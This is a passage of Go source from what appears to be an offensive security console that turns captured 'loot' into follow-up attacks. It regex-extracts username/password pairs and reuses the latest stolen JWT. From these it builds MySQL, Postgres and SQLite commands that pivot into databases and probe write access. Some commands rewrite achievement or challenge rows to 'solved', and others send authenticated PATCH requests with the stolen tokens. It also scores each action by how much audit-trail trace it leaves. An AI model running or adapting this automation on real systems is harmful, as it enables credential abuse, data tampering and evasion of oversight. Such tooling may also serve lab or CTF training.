	if strings.TrimSpace(h.Password) != "" {
		passPrefix = "PGPASSWORD=" + shellQuote(h.Password) + " "
	}
	return passPrefix + "psql -h " + shellQuote(h.Host) +
		" -p " + shellQuote(h.Port) +
		" -U " + shellQuote(h.User) +
		" -d " + shellQuote(db) +
		" -c \"SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema') LIMIT 8;\""
}

func postgresWriteProbeCommand(h dbCredentialHint) string {
	db := strings.TrimSpace(h.Database)
	if db == "" {
		db = "postgres"
	}
	passPrefix := ""
	if strings.TrimSpace(h.Password) != "" {
		passPrefix = "PGPASSWORD=" + shellQuote(h.Password) + " "
	}
	return passPrefix + "psql -h " + shellQuote(h.Host) +
		" -p " + shellQuote(h.Port) +
		" -U " + shellQuote(h.User) +
		" -d " + shellQuote(db) +
		" -c \"CREATE TEMP TABLE jsbb_opsec_probe(id int); DROP TABLE jsbb_opsec_probe;\""
}

func hasWritePrivilegeHint(meta string) bool {
	lower := strings.ToLower(strings.TrimSpace(meta))
	markers := []string{"write", "admin", "owner", "dba", "insert", "update", "alter", "drop"}
	for _, marker := range markers {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

func latestTokenFromTelemetry(root string) string {
	path := filepath.Join(root, "telemetry", "loot.jsonl")
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	for idx := len(lines) - 1; idx >= 0; idx-- {
		line := strings.TrimSpace(lines[idx])
		if line == "" {
			continue
		}
		var item lootEntry
		if err := json.Unmarshal([]byte(line), &item); err != nil {
			continue
		}
		if !strings.EqualFold(strings.TrimSpace(item.Kind), "token") && !strings.EqualFold(strings.TrimSpace(item.Kind), "jwt") {
			continue
		}
		token := strings.TrimSpace(item.Preview)
		if token != "" {
			return token
		}
	}
	return ""
}

type credentialPair struct {
	User string
	Pass string
}

func extractCredentialPairsFromLoot(loot []lootEntry) []credentialPair {
	out := []credentialPair{}
	seen := map[string]bool{}
	appendPair := func(user, pass string) {
		user = strings.TrimSpace(user)
		pass = strings.TrimSpace(pass)
		if user == "" || pass == "" {
			return
		}
		key := strings.ToLower(user + "|" + pass)
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, credentialPair{User: user, Pass: pass})
	}
	patterns := []*regexp.Regexp{
		regexp.MustCompile(`(?is)(?:\"(?:username|user|email|login)\"\s*:\s*\"([^\"]+)\").{0,160}?(?:\"(?:password|pass|pwd)\"\s*:\s*\"([^\"]+)\")`),
		regexp.MustCompile(`(?is)(?:\"(?:password|pass|pwd)\"\s*:\s*\"([^\"]+)\").{0,160}?(?:\"(?:username|user|email|login)\"\s*:\s*\"([^\"]+)\")`),
		regexp.MustCompile(`(?is)(?:\b(?:username|user|email|login)\b\s*[:=]\s*([^\s,;|]+)).{0,120}?(?:\b(?:password|pass|pwd)\b\s*[:=]\s*([^\s,;|]+))`),
		regexp.MustCompile(`(?is)(?:\b(?:password|pass|pwd)\b\s*[:=]\s*([^\s,;|]+)).{0,120}?(?:\b(?:username|user|email|login)\b\s*[:=]\s*([^\s,;|]+))`),
	}
	for _, item := range loot {
		meta := strings.ToLower(item.Kind + " " + item.Name + " " + item.Source + " " + item.Preview)
		if !strings.Contains(meta, "credential") &&
			!strings.Contains(meta, "password") &&
			!strings.Contains(meta, "login") &&
			!strings.Contains(meta, "username") &&
			!strings.Contains(meta, "email") {
			continue
		}
		content := strings.TrimSpace(item.Source + "\n" + item.Preview + "\n" + item.Name)
		if content == "" {
			continue
		}
		for idx, re := range patterns {
			matches := re.FindAllStringSubmatch(content, 6)
			for _, match := range matches {
				if len(match) < 3 {
					continue
				}
				if idx == 1 || idx == 3 {
					appendPair(match[2], match[1])
				} else {
					appendPair(match[1], match[2])
				}
			}
		}
	}
	if len(out) > 64 {
		out = out[:64]
	}
	return out
}

func normalizeLootEndpoint(baseURL, source string) string {
	base := strings.TrimSpace(baseURL)
	target := strings.TrimSpace(source)
	if target == "" {
		return strings.TrimRight(base, "/")
	}
	if strings.HasPrefix(strings.ToLower(target), "http://") || strings.HasPrefix(strings.ToLower(target), "https://") {
		return target
	}
	if base == "" {
		return target
	}
	if strings.HasPrefix(target, "/") {
		return strings.TrimRight(base, "/") + target
	}
	return strings.TrimRight(base, "/") + "/" + strings.TrimLeft(target, "/")
}

func hasAchievementSignal(item lootEntry, root string) bool {
	meta := strings.ToLower(strings.TrimSpace(item.Kind + " " + item.Name + " " + item.Source + " " + item.Preview))
	markers := []string{"achievement", "achievements", "challenge", "challenges", "trophy", "trophies", "scoreboard", "badge"}
	for _, marker := range markers {
		if strings.Contains(meta, marker) {
			return true
		}
	}
	sourcePath := resolveLootSourcePath(root, item.Source)
	if sourcePath != "" {
		snippet := strings.ToLower(readLootSourceSnippet(sourcePath, 32*1024))
		for _, marker := range markers {
			if strings.Contains(snippet, marker) {
				return true
			}
		}
	}
	return false
}

func mysqlAchievementReadCommand(h dbCredentialHint) string {
	passArg := ""
	if strings.TrimSpace(h.Password) != "" {
		passArg = "-p" + shellQuote(h.Password)
	}
	db := strings.TrimSpace(h.Database)
	if db == "" {
		db = "information_schema"
	}
	query := "SET @db='" + strings.ReplaceAll(db, "'", "") + "';" +
		"SET @t=(SELECT table_name FROM information_schema.tables WHERE table_schema=@db AND (LOWER(table_name) LIKE '%achiev%' OR LOWER(table_name) LIKE '%chall%' OR LOWER(table_name) LIKE '%troph%') LIMIT 1);" +
		"SET @sql=IF(@t IS NULL,'SELECT \\\"no achievement-like table found\\\" AS info;', CONCAT('SELECT * FROM `',@db,'`.`',@t,'` LIMIT 25;'));" +
		"PREPARE s FROM @sql; EXECUTE s; DEALLOCATE PREPARE s;"
	parts := []string{
		"mysql",
		"-h", shellQuote(h.Host),
		"-P", shellQuote(h.Port),
		"-u", shellQuote(h.User),
	}
	if passArg != "" {
		parts = append(parts, passArg)
	}
	parts = append(parts, "-e", shellQuote(query))
	return strings.Join(parts, " ")
}

func mysqlAchievementWriteCommand(h dbCredentialHint) string {
	passArg := ""
	if strings.TrimSpace(h.Password) != "" {
		passArg = "-p" + shellQuote(h.Password)
	}
	db := strings.TrimSpace(h.Database)
	if db == "" {
		db = "information_schema"
	}
	query := "SET @db='" + strings.ReplaceAll(db, "'", "") + "';" +
		"SET @t=(SELECT table_name FROM information_schema.tables WHERE table_schema=@db AND (LOWER(table_name) LIKE '%achiev%' OR LOWER(table_name) LIKE '%chall%' OR LOWER(table_name) LIKE '%troph%') LIMIT 1);" +
		"SET @c=(SELECT column_name FROM information_schema.columns WHERE table_schema=@db AND table_name=@t AND (LOWER(column_name) LIKE '%solv%' OR LOWER(column_name) LIKE '%complete%' OR LOWER(column_name) LIKE '%status%' OR LOWER(column_name) LIKE '%pwn%') LIMIT 1);" +
		"SET @sql=IF(@t IS NULL OR @c IS NULL,'SELECT \\\"no writable achievement-like column found\\\" AS info;', CONCAT('UPDATE `',@db,'`.`',@t,'` SET `',@c,'`=1 LIMIT 1; SELECT ROW_COUNT() AS rows_changed;'));" +
		"PREPARE s FROM @sql; EXECUTE s; DEALLOCATE PREPARE s;"
	parts := []string{
		"mysql",
		"-h", shellQuote(h.Host),
		"-P", shellQuote(h.Port),
		"-u", shellQuote(h.User),
	}
	if passArg != "" {
		parts = append(parts, passArg)
	}
	parts = append(parts, "-e", shellQuote(query))
	return strings.Join(parts, " ")
}

func postgresAchievementReadCommand(h dbCredentialHint) string {
	db := strings.TrimSpace(h.Database)
	if db == "" {
		db = "postgres"
	}
	passPrefix := ""
	if strings.TrimSpace(h.Password) != "" {
		passPrefix = "PGPASSWORD=" + shellQuote(h.Password) + " "
	}
	return passPrefix + "psql -h " + shellQuote(h.Host) +
		" -p " + shellQuote(h.Port) +
		" -U " + shellQuote(h.User) +
		" -d " + shellQuote(db) +
		" -c \"DO $$ DECLARE t text; BEGIN SELECT table_schema||'.'||table_name INTO t FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema') AND (LOWER(table_name) LIKE '%achiev%' OR LOWER(table_name) LIKE '%chall%' OR LOWER(table_name) LIKE '%troph%') LIMIT 1; IF t IS NULL THEN RAISE NOTICE 'no achievement-like table found'; ELSE EXECUTE 'SELECT * FROM '||t||' LIMIT 25'; END IF; END $$;\""
}

func postgresAchievementWriteCommand(h dbCredentialHint) string {
	db := strings.TrimSpace(h.Database)
	if db == "" {
		db = "postgres"
	}
	passPrefix := ""
	if strings.TrimSpace(h.Password) != "" {
		passPrefix = "PGPASSWORD=" + shellQuote(h.Password) + " "
	}
	return passPrefix + "psql -h " + shellQuote(h.Host) +
		" -p " + shellQuote(h.Port) +
		" -U " + shellQuote(h.User) +
		" -d " + shellQuote(db) +
		" -c \"DO $$ DECLARE t_schema text; t_name text; c_name text; BEGIN SELECT table_schema,table_name INTO t_schema,t_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema') AND (LOWER(table_name) LIKE '%achiev%' OR LOWER(table_name) LIKE '%chall%' OR LOWER(table_name) LIKE '%troph%') LIMIT 1; IF t_name IS NULL THEN RAISE NOTICE 'no achievement-like table found'; RETURN; END IF; SELECT column_name INTO c_name FROM information_schema.columns WHERE table_schema=t_schema AND table_name=t_name AND (LOWER(column_name) LIKE '%solv%' OR LOWER(column_name) LIKE '%complete%' OR LOWER(column_name) LIKE '%status%' OR LOWER(column_name) LIKE '%pwn%') LIMIT 1; IF c_name IS NULL THEN RAISE NOTICE 'no writable achievement-like column found'; RETURN; END IF; EXECUTE format('UPDATE %I.%I SET %I=TRUE WHERE ctid IN (SELECT ctid FROM %I.%I LIMIT 1)', t_schema,t_name,c_name,t_schema,t_name); END $$;\""
}

func sqliteAchievementReadCommand(path string) string {
	return "sqlite3 " + shellQuote(path) + " \"SELECT name FROM sqlite_master WHERE type='table' AND (LOWER(name) LIKE '%achiev%' OR LOWER(name) LIKE '%chall%' OR LOWER(name) LIKE '%troph%');\""
}

func sqliteAchievementWriteCommand(path string) string {
	return "t=$(sqlite3 " + shellQuote(path) + " \"SELECT name FROM sqlite_master WHERE type='table' AND (LOWER(name) LIKE '%achiev%' OR LOWER(name) LIKE '%chall%' OR LOWER(name) LIKE '%troph%') LIMIT 1;\"); c=$(sqlite3 " + shellQuote(path) + " \"PRAGMA table_info('$t');\" | awk -F'|' '{k=tolower($2); if(k ~ /solv|complete|status|pwn/){print $2; exit}}'); if [ -z \"$t\" ] || [ -z \"$c\" ]; then echo \"no writable achievement-like table/column found\"; else sqlite3 " + shellQuote(path) + " \"UPDATE \\\"$t\\\" SET \\\"$c\\\"=1 WHERE rowid IN (SELECT rowid FROM \\\"$t\\\" LIMIT 1); SELECT changes();\"; fi"
}

func collectionProbeFromLootItem(item lootEntry, targetURL string) (string, string, string, bool) {
	meta := strings.ToLower(item.Kind + " " + item.Name + " " + item.Source + " " + item.Preview)
	target := normalizeCollectionBaseEndpoint(item.Source, targetURL)
	if target == "" {
		target = normalizeLootEndpoint(targetURL, item.Source)
	}
	target = strings.TrimSpace(target)
	preview := strings.TrimSpace(item.Preview)
	firstID := ""
	payload := "{}"
	if preview != "" {
		if value, ok := parseJSONBody(preview); ok {
			records := jsonRecordMaps(value)
			if len(records) > 0 {
				firstID = firstExistingRecordValue(records[0], []string{"id", "_id", "uuid", "key", "slug", "txHash", "hash", "address"})
				firstID = strings.TrimSpace(strings.TrimSuffix(firstID, ".0"))
				payload = templateFromJSONRecord(records[0])
				return target, firstID, payload, strings.TrimSpace(target) != ""
			}
		}
	}
	if strings.TrimSpace(target) == "" {
		return "", "", "", false
	}
	isLikelyCollection := strings.EqualFold(strings.TrimSpace(item.Kind), "collection") ||
		strings.Contains(meta, "collection") ||
		strings.Contains(meta, "records") ||
		strings.Contains(strings.ToLower(target), "/api/") ||
		strings.Contains(strings.ToLower(target), "/rest/")
	if !isLikelyCollection {
		return "", "", "", false
	}
	return target, firstID, payload, true
}

func lootFollowupActions(item lootEntry, targetURL, root string) []controlAction {
	meta := strings.ToLower(item.Kind + " " + item.Name + " " + item.Source + " " + item.Preview)
	sourcePath := resolveLootSourcePath(root, item.Source)
	achievementSignal := hasAchievementSignal(item, root)
	actions := []controlAction{}
	hints := extractDBHints(item, root)
	for idx, hint := range hints {
		if idx >= 2 {
			break
		}
		switch strings.ToLower(strings.TrimSpace(hint.Engine)) {
		case "mysql":
			cmd := mysqlPivotCommand(hint)
			actions = append(actions, controlAction{
				Label:       "Loot Action :: mysql pivot (" + hint.User + "@" + hint.Host + ")",
				Description: "Auto-built from extracted loot credentials.",
				Mode:        "kali",
				Command:     "docker exec h3retik-kali bash -lc \"" + cmd + "\"",
				KaliShell:   cmd,
			})
			sampleCmd := mysqlSampleRowsCommand(hint)
			actions = append(actions, controlAction{
				Label:       "Loot Action :: mysql schema/sample",
				Description: "Enumerate schema metadata for exploit planning.",
				Mode:        "kali",
				Command:     "docker exec h3retik-kali bash -lc \"" + sampleCmd + "\"",
				KaliShell:   sampleCmd,
			})
			if achievementSignal {
				readCmd := mysqlAchievementReadCommand(hint)
				actions = append(actions, controlAction{
					Label:       "Loot Action :: mysql achievements explore",
					Description: "Read achievement/challenge rows from compromised DB.",
					Mode:        "kali",
					Command:     "docker exec h3retik-kali bash -lc \"" + readCmd + "\"",
					KaliShell:   readCmd,
				})
				if hasWritePrivilegeHint(meta) {
					writeAchCmd := mysqlAchievementWriteCommand(hint)
					actions = append(actions, controlAction{
						Label:       "Loot Action :: mysql achievements modify",
						Description: "Attempt write on achievement/challenge records (high opsec impact).",
						Mode:        "kali",
						Command:     "docker exec h3retik-kali bash -lc \"" + writeAchCmd + "\"",
						KaliShell:   writeAchCmd,
					})
				}
			}
			if hasWritePrivilegeHint(meta) {
				writeCmd := mysqlWriteProbeCommand(hint)
				actions = append(actions, controlAction{
					Label:       "Loot Action :: mysql write probe",
					Description: "Verify write capability (high opsec impact).",
					Mode:        "kali",
					Command:     "docker exec h3retik-kali bash -lc \"" + writeCmd + "\"",
					KaliShell:   writeCmd,
				})
			}
		case "postgres":
			cmd := postgresPivotCommand(hint)
			actions = append(actions, controlAction{
				Label:       "Loot Action :: postgres pivot (" + hint.User + "@" + hint.Host + ")",
				Description: "Auto-built from extracted loot credentials.",
				Mode:        "kali",
				Command:     "docker exec h3retik-kali bash -lc \"" + cmd + "\"",
				KaliShell:   cmd,
			})
			sampleCmd := postgresSampleRowsCommand(hint)
			actions = append(actions, controlAction{
				Label:       "Loot Action :: postgres schema/sample",
				Description: "Enumerate schema metadata for exploit planning.",
				Mode:        "kali",
				Command:     "docker exec h3retik-kali bash -lc \"" + sampleCmd + "\"",
				KaliShell:   sampleCmd,
			})
			if achievementSignal {
				readCmd := postgresAchievementReadCommand(hint)
				actions = append(actions, controlAction{
					Label:       "Loot Action :: postgres achievements explore",
					Description: "Read achievement/challenge rows from compromised DB.",
					Mode:        "kali",
					Command:     "docker exec h3retik-kali bash -lc \"" + readCmd + "\"",
					KaliShell:   readCmd,
				})
				if hasWritePrivilegeHint(meta) {
					writeAchCmd := postgresAchievementWriteCommand(hint)
					actions = append(actions, controlAction{
						Label:       "Loot Action :: postgres achievements modify",
						Description: "Attempt write on achievement/challenge records (high opsec impact).",
						Mode:        "kali",
						Command:     "docker exec h3retik-kali bash -lc \"" + writeAchCmd + "\"",
						KaliShell:   writeAchCmd,
					})
				}
			}
			if hasWritePrivilegeHint(meta) {
				writeCmd := postgresWriteProbeCommand(hint)
				actions = append(actions, controlAction{
					Label:       "Loot Action :: postgres write probe",
					Description: "Verify write capability (high opsec impact).",
					Mode:        "kali",
					Command:     "docker exec h3retik-kali bash -lc \"" + writeCmd + "\"",
					KaliShell:   writeCmd,
				})
			}
		}
	}
	if sourcePath != "" {
		actions = append(actions, controlAction{
			Label:       "Loot Action :: inspect artifact",
			Description: "Open compromised artifact content from loot source path.",
			Mode:        "local",
			Command:     "bash -lc \"sed -n '1,240p' " + shellQuote(sourcePath) + "\"",
			Args:        []string{"bash", "-lc", "sed -n '1,240p' " + shellQuote(sourcePath)},
		})
		if strings.HasSuffix(strings.ToLower(sourcePath), ".json") {
			actions = append(actions, controlAction{
				Label:       "Loot Action :: pretty json",
				Description: "Pretty-print JSON loot for fast parsing.",
				Mode:        "local",
				Command:     "jq . " + sourcePath,
				Args:        []string{"jq", ".", sourcePath},
			})
		}
		if strings.HasSuffix(strings.ToLower(sourcePath), ".db") || strings.HasSuffix(strings.ToLower(sourcePath), ".sqlite") || strings.Contains(meta, "sqlite") {
			actions = append(actions, controlAction{
				Label:       "Loot Action :: inspect sqlite",
				Description: "List tables from compromised sqlite artifact.",
				Mode:        "local",
				Command:     "sqlite3 " + sourcePath + " '.tables'",
				Args:        []string{"sqlite3", sourcePath, ".tables"},
			})
			if achievementSignal {
				readCmd := sqliteAchievementReadCommand(sourcePath)
				actions = append(actions, controlAction{
					Label:       "Loot Action :: sqlite achievements explore",
					Description: "List challenge/achievement tables in sqlite loot.",
					Mode:        "local",
					Command:     readCmd,
					Args:        []string{"bash", "-lc", readCmd},
				})
				if hasWritePrivilegeHint(meta) {
					writeScript := sqliteAchievementWriteCommand(sourcePath)
					actions = append(actions, controlAction{
						Label:       "Loot Action :: sqlite achievements modify",
						Description: "Attempt write on achievement-like sqlite rows (high opsec impact).",
						Mode:        "local",
						Command:     "bash -lc " + shellQuote(writeScript),
						Args:        []string{"bash", "-lc", writeScript},
					})
				}
			}
		}
	}

	if fitAction, ok := lootCredentialFitAction(item, targetURL, root); ok {
		actions = append(actions, fitAction)
	}
	if isCredentialSignalMeta(meta) {
		base := strings.TrimSpace(targetURL)
		if base != "" {
			actions = append(actions, controlAction{
				Label:       "Loot Action :: auth pivot check",
				Description: "Test credential/token pivot against active target root.",
				Mode:        "kali",
				Command:     "docker exec h3retik-kali bash -lc \"curl -sS -i " + shellQuote(strings.TrimRight(base, "/")) + "\"",
				KaliShell:   "curl -sS -i " + shellQuote(strings.TrimRight(base, "/")),
			})
		}
		probeEndpoints := lootCredentialFitEndpoints(root, targetURL, item)
		if len(probeEndpoints) > 0 {
			probeShell := buildEndpointProbeShell(probeEndpoints)
			actions = append(actions, controlAction{
				Label:       "Loot Action :: auth boundary check",
				Description: "Probe discovered auth/API boundaries from current telemetry map.",
				Mode:        "kali",
				Command:     "docker exec h3retik-kali bash -lc " + shellQuote(probeShell),
				KaliShell:   probeShell,
			})
		}
	}
	if item.Kind == "path" || strings.Contains(meta, "endpoint") || strings.Contains(meta, "path") || strings.HasPrefix(strings.ToLower(strings.TrimSpace(item.Source)), "http://") || strings.HasPrefix(strings.ToLower(strings.TrimSpace(item.Source)), "https://") {
		base := strings.TrimSpace(targetURL)
		target := strings.TrimSpace(item.Source)
		if strings.HasPrefix(target, "/") {
			if base == "" {
				target = ""
			} else {
				target = strings.TrimRight(base, "/") + target
			}
		}
		if target != "" && !strings.HasPrefix(strings.ToLower(target), "http://") && !strings.HasPrefix(strings.ToLower(target), "https://") {
			if base == "" {
				target = ""
			} else {
				target = strings.TrimRight(base, "/") + "/" + strings.TrimLeft(target, "/")
			}
		}
		if target != "" {
			actions = append(actions, controlAction{
				Label:       "Loot Action :: endpoint probe",
				Description: "Probe discovered endpoint/path from loot signal.",
				Mode:        "kali",
				Command:     "docker exec h3retik-kali bash -lc \"curl -sS -i " + shellQuote(target) + "\"",
				KaliShell:   "curl -sS -i " + shellQuote(target),
			})
		}
	}
	if target, firstID, payload, ok := collectionProbeFromLootItem(item, targetURL); ok {
		actions = append(actions, controlAction{
			Label:       "Loot Action :: collection inspect",
			Description: "Fetch full HTTP response for dynamic parser and action planning.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"curl -sS -i " + shellQuote(target) + "\"",
			KaliShell:   "curl -sS -i " + shellQuote(target),
		})
		actions = append(actions, controlAction{
			Label:       "Loot Action :: collection body sample",
			Description: "Body-only snapshot for fast diff/read when headers are not needed.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"curl -sS " + shellQuote(target) + " | sed -n '1,200p'\"",
			KaliShell:   "curl -sS " + shellQuote(target) + " | sed -n '1,200p'",
		})
		if token := strings.TrimSpace(latestTokenFromTelemetry(root)); token != "" && hasWritePrivilegeHint(meta) {
			writeTarget := strings.TrimRight(strings.TrimSpace(target), "/")
			if firstID != "" {
				writeTarget = writeTarget + "/" + url.PathEscape(firstID)
			}
			actions = append(actions, controlAction{
				Label:       "Loot Action :: collection write probe",
				Description: "Attempt authenticated update on discovered collection/record (high opsec impact).",
				Mode:        "kali",
				Command:     "docker exec h3retik-kali bash -lc \"curl -sS -X PATCH " + shellQuote(writeTarget) + " -H " + shellQuote("Authorization: Bearer "+token) + " -H 'Content-Type: application/json' --data " + shellQuote(payload) + "\"",
				KaliShell:   "curl -sS -X PATCH " + shellQuote(writeTarget) + " -H " + shellQuote("Authorization: Bearer "+token) + " -H 'Content-Type: application/json' --data " + shellQuote(payload),
			})
		}
	}
	if strings.Contains(meta, "onchain") || strings.Contains(meta, "tx") || strings.Contains(meta, "address-flow") || strings.Contains(meta, "contract") {
		actions = append(actions, controlAction{
			Label:       "Loot Action :: onchain inspect",
			Description: "Display recent onchain loot artifacts for immediate operator review.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"find /artifacts/onchain -maxdepth 3 -type f 2>/dev/null | sort | tail -n 20\"",
			KaliShell:   "find /artifacts/onchain -maxdepth 3 -type f 2>/dev/null | sort | tail -n 20",
		})
	}
	if len(actions) == 0 {
		actions = append(actions, controlAction{
			Label:       "Loot Action :: evidence digest",
			Description: "Inspect latest telemetry evidence around compromised loot.",
			Mode:        "local",
			Command:     "python3 ./scripts/telemetryctl.py show --run latest",
			Args:        []string{"python3", "./scripts/telemetryctl.py", "show", "--run", "latest"},
		})
	}
	return actions
}

func lootFollowupActionsForSelection(loot []lootEntry, selected int, targetURL, root string) []controlAction {
	if selected < 0 || selected >= len(loot) {
		return nil
	}
	return lootFollowupActions(loot[selected], targetURL, root)
}

func lootFollowupAction(item lootEntry, targetURL, root string) controlAction {
	actions := lootFollowupActions(item, targetURL, root)
	if len(actions) == 0 {
		return controlAction{}
	}
	return actions[0]
}

func lootOpsecAlert(action controlAction) string {
	meta := strings.ToLower(action.Command + " " + action.KaliShell + " " + action.Label)
	switch {
	case strings.Contains(meta, "write probe"), strings.Contains(meta, "create temp"), strings.Contains(meta, "drop table"), strings.Contains(meta, "update "), strings.Contains(meta, "delete "), strings.Contains(meta, "-x put"), strings.Contains(meta, "-x patch"):
		return "critical trace risk: write/tamper operations are high-signal in audit trails."
	case strings.Contains(meta, "show databases"), strings.Contains(meta, "show tables"), strings.Contains(meta, "psql"):
		return "high trace risk: db metadata queries are usually logged (audit/general logs)."
	case strings.Contains(meta, "/api/users"), strings.Contains(meta, "auth pivot"):
		return "medium trace risk: authenticated API pivots leave request/session traces."
	case strings.Contains(meta, "sed -n"), strings.Contains(meta, "tail -n"), strings.Contains(meta, "telemetryctl.py show"):
		return "low trace risk: read-only local evidence inspection."
	default:
		return "review command footprint before executing."
	}
}

func lootCompromiseMap(loot []lootEntry, width int) string {
	hasDB := false
	hasCred := false
	hasFiles := false
	hasTokens := false
	for _, item := range loot {
		meta := strings.ToLower(item.Kind + " " + item.Name + " " + item.Source + " " + item.Preview)
		if strings.Contains(meta, "db") || strings.Contains(meta, "database") || strings.Contains(meta, "mysql") || strings.Contains(meta, "postgres") || strings.Contains(meta, "sqlite") {
			hasDB = true
		}
		if strings.Contains(meta, "credential") || strings.Contains(meta, "password") || strings.Contains(meta, "hash") {
			hasCred = true
		}
		if strings.Contains(meta, "token") || strings.Contains(meta, "jwt") || strings.Contains(meta, "session") {
			hasTokens = true
		}
		if strings.Contains(meta, "artifact") || strings.Contains(meta, ".txt") || strings.Contains(meta, ".json") || strings.Contains(meta, ".db") || strings.Contains(meta, "file") {
			hasFiles = true
		}
	}
	lines := []string{
		fmt.Sprintf("%s DB", statusBadge(ternary(hasDB, "done", "idle"))),
		fmt.Sprintf("%s CREDS", statusBadge(ternary(hasCred, "done", "idle"))),
		fmt.Sprintf("%s TOKENS", statusBadge(ternary(hasTokens, "done", "idle"))),
		fmt.Sprintf("%s FILES", statusBadge(ternary(hasFiles, "done", "idle"))),
	}
	return wrap(strings.Join(lines, " | "), width)
}

func taxonomyDossier(category, sub, targetURL, deepEngine string) []string {
	base := strings.TrimSpace(targetURL)
	seed := targetHostFromURL(base)
	if seed == "" {
		seed = "example.com"
	}
	switch category + "::" + sub {
	case "INPUT::SEED_ENTITY":
		return []string{
			"Set explicit seed(s): name/email/username + jurisdiction/context notes.",
			"Start seed harvest command from CTRL FIRE in OSINT mode.",
			"Record seed assumptions before expansion.",
		}
	case "INPUT::SEED_INFRA":
		return []string{
			"Seed with domain/url/ip and validate scope boundaries.",
			"Run `osint-seed-harvest " + seed + " 200`.",
			"Promote discovered roots to discovery/collection stages.",
		}
	case "DISCOVERY::ENTITY_EXPANSION":
		return []string{
			"Expand linked usernames, emails, and public profile fingerprints.",
			"Capture every new handle/email as structured evidence.",
			"Cross-link entity pivots before moving to bulk collection.",
		}
	case "DISCOVERY::INFRA_EXPANSION":
		return []string{
			"Run deep automation with selected engine (`" + strings.ToUpper(deepEngine) + "`).",
			"Pivot from certs/subdomains to services/endpoints.",
			"Track parent-child infra relationships for graph ingestion.",
		}
	case "COLLECTION::PASSIVE_PULL":
		return []string{
			"Run recon-ng module chain with source `" + seed + "`.",
			"Capture artifact paths under `artifacts/osint` and telemetry loot.",
			"Keep passive-only boundary when legal/ethical scope requires it.",
		}
	case "COLLECTION::ACTIVE_PULL":
		return []string{
			"Run deeper web collection (`reNgine` API/runtime checks).",
			"Collect snapshots/timelines for temporal analysis.",
			"Tag active collection artifacts separately from passive intelligence.",
		}
	case "PROCESSING::NORMALIZE":
		return []string{
			"Normalize outputs into consistent fields (entity,type,source,time,confidence).",
			"Maintain source provenance for each normalized record.",
			"Prepare normalized exports for Neo4j or Python correlation jobs.",
		}
	case "PROCESSING::DEDUPE":
		return []string{
			"Deduplicate by canonical identity keys (email/domain/username/IP).",
			"Keep strongest evidence reference and merge aliases.",
			"Track dedupe decisions in analyst notes for auditability.",
		}
	case "ANALYSIS::CORRELATE":
		return []string{
			"Feed normalized entities into graph/timeline correlation.",
			"Highlight shortest-path relationships and repeated infrastructure overlaps.",
			"Escalate only high-confidence correlated clusters.",
		}
	case "ANALYSIS::RISK_SCORE":
		return []string{
			"Score findings by confidence, impact, recency, and source diversity.",
			"Prioritize investigative journalism leads with verifiable public evidence.",
			"Mark uncertain claims for validation stage instead of reporting.",
		}
	case "VALIDATION::CROSS_CHECK":
		return []string{
			"Require at least two independent corroborating sources per critical claim.",
			"Replay key commands and compare outputs over time.",
			"Flag contradictions before report export.",
		}
	case "VALIDATION::GAP_TRACK":
		return []string{
			"List missing prerequisites directly in this panel.",
			"Assign acquisition command per missing prerequisite.",
			"Do not advance to reporting until gaps are closed or explicitly accepted.",
		}
	case "REPORTING::INTEL_EXPORT":
		return []string{
			"Snapshot telemetry + OSINT artifacts for immutable evidence bundle.",
			"Export structured data for Neo4j/custom Python reporting.",
			"Include reproducible command chain in appendix.",
		}
	case "REPORTING::ACTION_BRIEF":
		return []string{
			"Produce concise journalist/operator brief: what happened, confidence, evidence.",
			"List unresolved uncertainties and recommended next pulls.",
			"Attach artifact locations and phase mapping for rapid follow-up.",
		}
	default:
		return []string{"No dossier step mapping for this taxonomy node yet."}
	}
}

func taxonomyFollowupAction(category, sub, targetURL, deepEngine string) controlAction {
	base := strings.TrimSpace(targetURL)
	seed := targetHostFromURL(base)
	if seed == "" {
		seed = "example.com"
	}
	reconCmd := "modules load recon/domains-hosts/bing_domain_web; options set SOURCE " + seed + "; run"
	deepCmd := "osint-deep-bbot " + seed
	if strings.EqualFold(deepEngine, "spiderfoot") {
		deepCmd = "osint-deep-spiderfoot " + seed
	}
	switch category + "::" + sub {
	case "INPUT::SEED_ENTITY", "INPUT::SEED_INFRA":
		return controlAction{
			Label:       "Fire Follow-Up :: seed-harvest",
			Description: "Initial seed harvest with theHarvester wrapper.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"osint-seed-harvest " + seed + " 200\"",
			KaliShell:   "osint-seed-harvest " + seed + " 200",
		}
	case "DISCOVERY::ENTITY_EXPANSION", "DISCOVERY::INFRA_EXPANSION":
		return controlAction{
			Label:       "Fire Follow-Up :: deep-automation",
			Description: "Deep automation engine selected in CTRL FIRE mode.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"" + deepCmd + "\"",
			KaliShell:   deepCmd,
		}
	case "COLLECTION::PASSIVE_PULL":
		return controlAction{
			Label:       "Fire Follow-Up :: recon-ng",
			Description: "Run recon-ng custom module chain for passive enrichment.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"osint-reconng \\\"" + reconCmd + "\\\"\"",
			KaliShell:   "osint-reconng \"" + reconCmd + "\"",
		}
	case "COLLECTION::ACTIVE_PULL":
		return controlAction{
			Label:       "Fire Follow-Up :: rengine-status",
			Description: "Check reNgine scaffold/API readiness for deep web dive.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"osint-rengine local-status\"",
			KaliShell:   "osint-rengine local-status",
		}
	case "PROCESSING::NORMALIZE", "PROCESSING::DEDUPE":
		return controlAction{
			Label:       "Fire Follow-Up :: artifact-index",
			Description: "List collected OSINT artifacts for normalization/dedupe.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"find /artifacts/osint -maxdepth 3 -type f 2>/dev/null | sort\"",
			KaliShell:   "find /artifacts/osint -maxdepth 3 -type f 2>/dev/null | sort",
		}
